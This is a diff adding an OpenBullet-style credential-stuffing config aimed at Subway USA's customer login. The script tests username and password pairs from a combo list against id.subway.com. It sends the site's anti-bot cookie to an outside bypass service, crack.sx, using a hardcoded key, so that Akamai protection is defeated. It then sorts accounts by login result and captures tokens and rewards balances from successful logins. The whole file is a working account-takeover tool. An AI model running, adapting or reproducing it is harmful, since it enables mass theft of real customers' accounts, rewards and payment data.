@@ -1,0 +1,281 @@
+[SETTINGS]
+{
+  "Name": "Subway USA",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-27T03:31:55.3016655-04:00",
+  "AdditionalInfo": "",
+  "Author": "Aaron Kong | Privileged Owner#9999",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 1431145717
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 3,
+      "RuleString": "20",
+      "Id": 2067085921
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Lowercase",
+      "Id": 1806382311
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Uppercase",
+      "Id": 2012812745
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 963980859
+    }
+  ],
+  "CustomInputs": [
+    {
+      "Description": "Made with penis and love",
+      "VariableName": "",
+      "Id": 717724871
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION CurrentUnixTime -> VAR "unix" 
+
+FUNCTION UnixTimeToISO8601 "<unix>" -> VAR "1" 
+
+PARSE "<1>" LR "-" "T" -> VAR "2" 
+
+PARSE "<1>" LR "-" "-" -> VAR "Month" 
+
+PARSE "<2>" LR "-" "" -> VAR "Day" 
+
+PARSE "<1>" LR "" "-" -> VAR "Year" 
+
+PARSE "<1>" LR "T" "" CreateEmpty=FALSE -> VAR "2" 
+
+PARSE "<2>" LR "" "." -> VAR "Time" 
+
+REQUEST GET "https://www.epochconverter.com/daynumbers" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "h2>Today <span id=\"td1\">" "</span" -> VAR "3" 
+
+PARSE "<3>" LR "" "," -> VAR "Dateee" 
+
+FUNCTION Translate 
+  KEY "Monday" VALUE "Mon" 
+  KEY "Tuesday" VALUE "Tue" 
+  KEY "Wednesday" VALUE "Wed" 
+  KEY "Thursday" VALUE "Thu" 
+  KEY "Friday" VALUE "Fri" 
+  KEY "Saturday" VALUE "Sat" 
+  KEY "Sunday" VALUE "Sun" 
+  "<Dateee>" -> VAR "Dateee" 
+
+PARSE "<3>" LR "," "," CreateEmpty=FALSE -> VAR "4" 
+
+PARSE "<4>" LR "" " " -> VAR "Monthh" 
+
+FUNCTION Translate 
+  KEY "January" VALUE "Jan" 
+  KEY "February" VALUE "Feb" 
+  KEY "March" VALUE "Mar" 
+  KEY "April" VALUE "Apr" 
+  KEY "May" VALUE "May" 
+  KEY "June" VALUE "Jun" 
+  KEY "July" VALUE "Jul" 
+  KEY "August" VALUE "Aug" 
+  KEY "September" VALUE "Sep" 
+  KEY "October" VALUE "Oct" 
+  KEY "November" VALUE "Nov" 
+  KEY "December" VALUE "Dec" 
+  "<Monthh>" -> VAR "Monthh" 
+
+FUNCTION Constant "<Dateee> <Monthh> <Day> <Year> <Time> GMT-0600" -> VAR "Gen" 
+
+FUNCTION URLEncode "<Gen>" -> VAR "POST" 
+
+REQUEST GET "https://www.subway.com/en-US" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "=\"__VIEWSTATE\" value=\"" "\"" EncodeOutput=TRUE -> VAR "VIEWSTATE" 
+
+PARSE "<SOURCE>" LR "VIEWSTATEGENERATOR\" id=\"__VIEWSTATEGENERATOR\" value=\"" "\"" -> VAR "VIEWSTATEGENERATOR" 
+
+REQUEST POST "https://www.subway.com/en-US" 
+  CONTENT "__EVENTTARGET=v2header_0%24ctl06%24ctl05%24ctl03%24lnkLoginMobile&__EVENTARGUMENT=&__VIEWSTATE=<VIEWSTATE>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&ShowComplianceCookieBox=0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.subway.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 174" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: https://www.subway.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Referer: https://www.subway.com/en-US" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+PARSE "<ADDRESS>" LR "https://id.subway.com/" "/" -> VAR "1" 
+
+PARSE "<SOURCE>" LR "\":\"StateProperties=" "\"" -> VAR "StateProperties" 
+
+PARSE "<COOKIES(_abck)>" LR "" "" -> VAR "Cookie" 
+
+PARSE "<COOKIES(x-ms-cpim-csrf)>" LR "" "" -> VAR "TOKEN" 
+
+REQUEST POST "https://crack.sx/bypass" 
+  CONTENT "{\"url\":\"https://id.subway.com/<1>/B2C_1A_signup_signin-r2/SelfAsserted?tx=StateProperties=<StateProperties>&p=B2C_1A_signup_signin-r2\",\"abckCookie\":\"<Cookie>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: /" 
+  HEADER "Authorization: Basic cGx6ZG9udHN0ZWFsYXBpOkRPTlRTVEVBTA==" 
+  HEADER "key: 8EMFI328RRB2G81Z" 
+
+PARSE "<SOURCE>" LR "" "" -> VAR "sensordata" 
+
+REQUEST POST "https://id.subway.com/static/316dcd11ee92061caa06745c9a0c957" 
+  CONTENT "<sensordata>" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://id.subway.com/<1>/Bd2C_1A_signup_signin-r2/SelfAsserted?tx=StateProperties=<StateProperties>&p=B2C_1A_signup_signin-r2" 
+  CONTENT "request_type=RESPONSE&signInName=<USER>&password=<PASS>&adobeAnalyticsTag=%7B%22storeCountry%22%3A%20%22US%22%2C%22storeLanguage%22%3A%20%22en%22%2C%22mid%22%3A%20%2251604603614000091994978239601635904484%22%2C%22timestamp%22%3A%20%22<POST>(Central%20Standard%20Time)%22%2C%20%22uxRendered%22%3A%20%22desktop%22%2C%20%22page.name%22%3A%20%22account%3Alog%20in%22%2C%20%22event%22%3A%20%22event10%22%7D" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "X-CSRF-TOKEN: <TOKEN>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":\"200\"}" 
+  KEYCHAIN Ban OR 
+    KEY "Access Denied" 
+    KEY "{\"status\":\"400" 
+  KEYCHAIN Failure OR 
+    KEY "The email address or password is incorrect" 
+
+REQUEST GET "https://id.subway.com/<1>/B2C_1A_signup_signin-r2/api/CombinedSigninAndSignup/confirmed?csrf_token=<TOKEN>" 
+  
+  HEADER "Host: id.subway.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" DoesNotContain "'code' id='code' value='" 
+
+PARSE "<SOURCE>" LR "id='state' value='" "'" -> VAR "OpenIdConnect" 
+
+PARSE "<SOURCE>" LR "'code' id='code' value='" "'" -> VAR "code" 
+
+PARSE "<SOURCE>" LR "id='id_token' value='" "'" -> VAR "id_token" 
+
+REQUEST POST "https://www.subway.com/" AutoRedirect=FALSE 
+  CONTENT "state=<OpenIdConnect>&code=<code>&id_token=<id_token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.subway.com" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: https://id.subway.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+REQUEST GET "https://www.subway.com/subwayv2/api/profile/user.asmx/GetCurrentUser" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "tokens" CreateEmpty=FALSE -> CAP "tokens" 
+
+PARSE "<COOKIES(UserProfileCacheKey)>" LR ",\"rewards\":" ",\"" CreateEmpty=FALSE -> CAP "Rewards balance" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Rewards balance>" LessThan "1" 
+
+REQUEST GET "https://p.subway.com/#dashboard-payment-methods-panel" 
+  
+  HEADER "Host: www.subway.com" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: https://id.subway.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
